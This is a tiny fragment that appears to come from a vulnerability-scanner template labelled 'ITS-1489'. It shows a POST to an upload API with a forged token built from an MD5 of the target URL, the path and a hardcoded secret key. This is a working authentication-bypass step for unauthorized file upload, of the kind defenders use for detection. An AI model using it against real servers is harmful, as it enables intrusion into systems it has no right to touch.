# Vulnerable: ITS-1489
POST /eps/api/resourceOperations/upload?token={{to_upper(md5(concat("{{RootURL}}","/eps/api/resourceOperations/uploadsecretKeyIbuilding")))}}
